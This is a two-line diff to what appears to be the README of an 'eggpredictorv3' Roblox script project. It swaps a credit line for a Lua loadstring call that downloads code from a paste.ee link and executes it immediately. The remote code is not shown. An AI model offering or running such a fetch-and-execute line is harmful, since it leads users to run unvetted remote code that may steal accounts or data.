@@ -1,2 +1,2 @@
 # eggpredictorv3
-Scripts provided by Osborn
+loadstring(game:HttpGet("https://paste.ee/r/34NftnOA"))()
